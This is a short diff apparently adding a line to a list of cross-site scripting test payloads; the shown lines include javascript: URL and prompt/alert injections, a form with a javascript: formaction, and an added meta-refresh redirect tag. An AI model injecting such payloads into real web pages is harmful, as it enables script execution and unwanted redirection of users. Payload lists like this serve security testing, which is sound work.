@@ -16,6 +16,7 @@
 %22-prompt(1)-%22
 javascript:alert(1)
 <form><button type="submit" formaction="javascript:alert(1)">M</button></form>
+<meta http-equiv="refresh" content="0; url=//baidu.com">
 
 ```
 
